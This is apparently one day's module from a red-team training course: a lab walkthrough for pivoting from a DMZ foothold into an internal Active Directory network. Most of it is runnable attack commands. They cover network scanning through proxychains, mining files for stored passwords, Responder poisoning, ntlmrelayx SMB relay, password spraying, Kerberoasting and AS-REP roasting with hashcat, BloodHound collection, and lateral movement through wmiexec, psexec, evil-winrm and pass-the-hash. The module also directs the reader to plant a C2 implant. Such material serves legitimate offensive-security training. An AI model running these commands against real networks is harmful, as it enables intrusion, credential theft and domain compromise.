---
title: "Offshore Lab Episode 2 — Internal Pivoting and Credential Harvesting"
tags: [red-team, offshore, lab, pivoting, lateral-movement, credential-harvesting,
  SMB-relay, bloodhound, internal-recon, T1021.002, T1557.001, T1003, ATT&CK]
module: 08-RedTeam-03
day: 536
related_topics:
  - Offshore Lab Episode 1 (Day 535)
  - Offshore Lab Episode 3 (Day 537)
  - Offshore Environment Methodology (Day 534)
  - SMB Relay and LLMNR Poisoning (Day 232)
  - Lateral Movement Advanced (Day 498)
---

# Day 536 — Offshore Lab Episode 2: Internal Pivoting and Credential Harvesting

> "The internal network is where the real work begins. You have a foothold in
> the DMZ — that is a beach head, not a victory. The internal LAN is where the
> domain controllers live, where the sysadmin's workstation lives, where the
> service accounts with keys to everything sit. Your pivot is built. Now walk
> through it and map what is inside."
>
> — Ghost

---

## Goals

Enumerate the internal network through the DMZ pivot established in Episode 1.
Harvest credentials via multiple methods: config files, LLMNR/NBT-NS
poisoning, SMB relay, Kerberos attacks, and credential spraying.
Establish a second C2 beacon inside the internal LAN.
Build BloodHound graph for the target AD domain.
Identify and stage the highest-priority lateral movement paths.

**Prerequisites:** Episode 1 complete (DMZ foothold, pivot deployed, C2 active).
**Time budget:** 5 hours.

---

## Phase 1 — Internal Network Enumeration (60 min)

### Step 1.1 — Subnet Discovery and Host Discovery

```bash
# Via proxychains (pivot from Episode 1 must be running)
# OR via Ligolo-ng transparent routing (no proxychains needed)

# Identify internal subnets from the DMZ host:
# (Run on the compromised DMZ host — not through the proxy)
ip route                  # Linux
ipconfig /all             # Windows
arp -a                    # ARP cache reveals hosts the DMZ host talks to

# Internal host scan via pivot:
proxychains nmap -sT -Pn --min-rate 2000 \
    -p 22,80,443,445,3389,5985,8080,1433,3306 \
    10.10.10.0/24 -oG internal_hosts.txt

# If you have Ligolo-ng set up, no proxychains needed:
nmap -sT -Pn --min-rate 2000 -p 22,80,443,445,3389,5985 \
    10.10.10.0/24 -oG internal_hosts.txt

# Parse live hosts with interesting ports
grep "open" internal_hosts.txt | grep "445" | awk '{print $2}'  # SMB hosts
grep "open" internal_hosts.txt | grep "3389" | awk '{print $2}' # RDP hosts
grep "open" internal_hosts.txt | grep "5985" | awk '{print $2}' # WinRM hosts
```

### Step 1.2 — Service and Share Enumeration

```bash
# CME quick sweep — identify domains, OS versions, signing status
proxychains crackmapexec smb 10.10.10.0/24 \
    --no-bruteforce 2>/dev/null | tee cme_sweep.txt

# Identify SMB signing disabled (relay attack candidates)
grep "signing: False" cme_sweep.txt > relay_targets.txt

# Share enumeration with known credentials (from Episode 1 harvest)
proxychains crackmapexec smb 10.10.10.0/24 \
    -u 'discovered_user' -p 'discovered_pass' \
    --shares 2>/dev/null | tee share_enum.txt

# List interesting shares
grep -i "READ\|WRITE" share_enum.txt | grep -v "IPC\|print"

# LDAP enumeration for AD info (domain controller IP required)
proxychains ldapsearch -x -H ldap://10.10.10.10 \
    -D "corp.local\discovered_user" -w 'discovered_pass' \
    -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

### Step 1.3 — Identify Domain Controller and Key Infrastructure

```bash
# Identify DC via DNS (from any domain-joined host)
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local <DC_IP>

# Or via nmap:
proxychains nmap -p 88,389,636,3268,3269 10.10.10.0/24 -Pn -sT

# Kerberos (88) + LDAP (389) + LDAPS (636) + Global Catalog (3268) = DC

# Further enumerate the DC:
proxychains nmap -sV -p 88,389,445,3268 <DC_IP> -Pn -sT

# Web interfaces on domain hosts:
proxychains whatweb http://<INTERNAL_IP>
```

---

## Phase 2 — Credential Harvesting (90 min)

### Method 1 — Config File Mining on DMZ Host

```bash
# On the already-compromised DMZ host — look for service account credentials
# These are the most common easy wins in real environments

# Web application configs:
find / -name "*.conf" -o -name "*.ini" -o -name "*.env" \
    -o -name "*.xml" -o -name "*.yaml" 2>/dev/null | \
    xargs grep -l "password\|passwd\|secret\|token" 2>/dev/null

# Database connection strings:
grep -rn "Data Source=\|Server=.*Database=\|ConnectionString\|mysql://\|mongodb://" \
    /var/www /opt /app 2>/dev/null

# Common specific files:
cat /etc/mysql/my.cnf 2>/dev/null
cat ~/.bash_history | grep -i "pass\|token\|secret" 2>/dev/null
find / -name ".env" 2>/dev/null -exec cat {} \;
```

### Method 2 — LLMNR/NBT-NS Poisoning with Responder

```bash
# LLMNR/NBT-NS poisoning — works when hosts on the internal network
# broadcast name resolution queries for non-existent hostnames
# Responder answers as the requested host → captures NTLMv2 hashes

# Run Responder on the interface facing the internal subnet
# (if you have Ligolo-ng set up, run on the ligolo interface)
# Or run on the DMZ host itself (if it has access to the internal LAN):

# On attack host via Ligolo tunnel (if internal subnet is routed):
sudo responder -I ligolo -v -wrf

# On the compromised DMZ host (if it has an internal NIC):
./Responder.py -I eth1 -v -wrf

# Captured hashes go to /usr/share/responder/logs/
# Format: NTLMv2 — crack with hashcat:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Example captured hash format:
# user::CORP:aaaaaaaaaaaaaa:XXXXXXXXXXXXXXXXXXXXXXXX:...
# Module: 5600 (NetNTLMv2)
```

### Method 3 — SMB Relay Attack

```bash
# If SMB signing is disabled on internal hosts (from Step 1.2):
# Relay NTLMv2 hashes captured by Responder to those hosts

# Step 1: Disable SMB and HTTP in Responder (we only want to capture, not respond)
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# Step 2: Start Responder in capture mode
sudo responder -I ligolo -v

# Step 3: In a second terminal, start ntlmrelayx
# targeting all relay-candidate hosts from relay_targets.txt:
proxychains impacket-ntlmrelayx \
    -tf relay_targets.txt \
    -smb2support \
    -socks                # opens a SOCKS server with relayed sessions

# Result: when a domain user triggers an LLMNR query,
# ntlmrelayx relays the auth to your target list
# -socks: gives you a SOCKS proxy to run commands authenticated as that user:
proxychains crackmapexec smb <TARGET> \
    -u <relayed_user> -p '' --no-pass \
    --shares
```

### Method 4 — Credential Spraying with Harvested Wordlist

```bash
# Build a spray list from known credentials + common patterns:
# Known users from LDAP + patterns: Password1, Company2024!, etc.

# Get user list via LDAP:
proxychains impacket-GetADUsers \
    -all corp.local/discovered_user:'discovered_pass' \
    -dc-ip <DC_IP> | tee domain_users.txt

# Extract sAMAccountNames:
grep -oP 'CN=\K[^,]+' domain_users.txt > usernames.txt

# Password spray (low and slow — avoid lockout):
# First: check lockout policy
proxychains crackmapexec smb <DC_IP> \
    -u 'discovered_user' -p 'discovered_pass' \
    --pass-pol

# Then spray at 1 attempt per user with ≥ 30-min gaps:
proxychains crackmapexec smb 10.10.10.0/24 \
    -u usernames.txt -p 'Password1' \
    --continue-on-success 2>/dev/null | grep "+"

# If lockout threshold > 5: try 4 attempts then wait 35 minutes
```

### Method 5 — Kerberoasting

```bash
# Request TGS tickets for service accounts (SPN-based)
# Any domain user can do this — no special privileges required

proxychains impacket-GetUserSPNs \
    corp.local/discovered_user:'discovered_pass' \
    -dc-ip <DC_IP> \
    -request -outputfile kerberoast_hashes.txt

# Crack offline:
hashcat -m 13100 kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt --force

# ASREPRoasting (accounts with "Do not require Kerberos preauthentication"):
proxychains impacket-GetNPUsers \
    corp.local/ -no-pass \
    -dc-ip <DC_IP> \
    -usersfile usernames.txt \
    -outputfile asrep_hashes.txt

hashcat -m 18200 asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt --force
```

---

## Phase 3 — BloodHound Data Collection (30 min)

```bash
# BloodHound is mandatory before you make another lateral movement decision.
# Do not guess the attack path — enumerate it.

# From attack host via proxychains:
proxychains bloodhound-python \
    -u discovered_user -p 'discovered_pass' \
    -ns <DC_IP> -d corp.local \
    -c All,LoggedOn \
    --zip -o bloodhound_data.zip

# Or: deploy SharpHound via C2 session on an internal host (if you have one):
execute-assembly SharpHound.exe \
    -c All,LoggedOn --zipfilename bh.zip --outputdirectory C:\Temp

# Import into BloodHound:
# BloodHound UI → Upload Data → select bloodhound_data.zip

# Immediate queries to run after import:
# 1. "Find all Domain Admins"
# 2. "Find Shortest Path to Domain Admins"
# 3. "Find Principals with DCSync Rights"
# 4. "Shortest Path from Owned Principals" (mark discovered_user as Owned)
# 5. "Users with Most Local Admin Rights"
```

---

## Phase 4 — Establish Second C2 Beacon on Internal Host (60 min)

```bash
# At this point you should have at least one set of credentials
# that work on an internal host (from Kerberoasting, spraying, relay, or config files)

# Target selection:
# Priority 1: Workstation where an admin user is logged in (from BloodHound LoggedOn)
# Priority 2: Host where your credentials have local admin (from CME sweep)
# Priority 3: Any internal Windows host

# Lateral movement to target (credential-based):
# Option A: WMI execution (T1047)
proxychains impacket-wmiexec corp.local/discovered_user:'pass'@<INTERNAL_IP>

# Option B: PsExec (T1021.002 — noisy, creates a service)
proxychains impacket-psexec corp.local/discovered_user:'pass'@<INTERNAL_IP>

# Option C: WinRM (T1021.006 — quieter than PsExec)
proxychains evil-winrm -i <INTERNAL_IP> \
    -u discovered_user -p 'pass'

# Option D: SMB pass-the-hash (if you have an NTLM hash, not plaintext)
proxychains impacket-wmiexec -hashes :<NTLM_HASH> \
    corp.local/discovered_user@<INTERNAL_IP>

# Once you have command execution on the internal host,
# deploy C2 implant (same process as Episode 1 Phase 5):
# Download from attacker web server, execute, verify callback
```

---

## Episode 2 Completion Checklist

```
Internal Enumeration:
  ☐ All internal subnets documented (at least one discovered)
  ☐ All internal hosts with key ports documented
  ☐ Domain Controller IP identified
  ☐ SMB signing status mapped (signing enabled vs disabled per host)

Credential Harvesting:
  ☐ At least 2 credential sets obtained from internal harvesting
  ☐ Kerberoasting tickets cracked (at least 1 service account)
  ☐ Spray or ASREP results documented (even if no hits)
  ☐ All credentials in notes: username, hash/plaintext, source

BloodHound:
  ☐ BloodHound data collected and imported
  ☐ Attack paths to Domain Admin identified (at least 1 path)
  ☐ Screenshot: shortest path query result showing the DA path

Lateral Movement:
  ☐ Second C2 beacon established on internal host
  ☐ Process parent documented (how the implant was launched)
  ☐ New host fully enumerated: local users, local admins, running processes

Notes completeness:
  ☐ Network diagram updated (DMZ + internal zone)
  ☐ All commands run are logged
  ☐ All credentials in structured notes with source
  ☐ BloodHound attack paths screenshotted and annotated
```

---

## Key Takeaways

1. Config files on DMZ hosts consistently yield the most impactful credentials
   in real engagements. Web apps, databases, and monitoring agents routinely
   store plaintext credentials for internal services. Always search them
   before moving to noisier techniques.
2. LLMNR/NBT-NS poisoning works because Windows broadcasts name resolution
   queries by default. Every environment that has not disabled LLMNR
   (via GPO: Computer Configuration → Policies → Administrative Templates
   → Network → DNS Client → Turn Off Multicast Name Resolution = Enabled)
   is vulnerable.
3. BloodHound is not optional — it is mandatory before any lateral movement
   decision in an AD environment. The shortest path query turns a complex
   AD graph into a specific, executable sequence of steps. Without it, you
   are guessing.
4. SMB relay is the most reliable lateral movement technique in environments
   with SMB signing disabled, because it does not require cracking any
   password. If SMB signing is enforced everywhere, this attack fails
   entirely — which is why SMB signing enforcement is the single highest-impact
   defensive control against relay attacks.
5. Kerberoasting is low-risk (no failed logins, no lockouts) and high-reward
   (service account passwords are often old and weak). It must be in your
   toolbox as a standard AD enumeration step, not an optional technique.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q536.1, Q536.2 …).

---

## Navigation

← Previous: [Day 535 — Offshore Lab Episode 1: External Foothold](DAY-0535-Offshore-Lab-Episode-1-External-Foothold.md)
→ Next: [Day 537 — Offshore Lab Episode 3: Domain Compromise](DAY-0537-Offshore-Lab-Episode-3-Domain-Compromise.md)
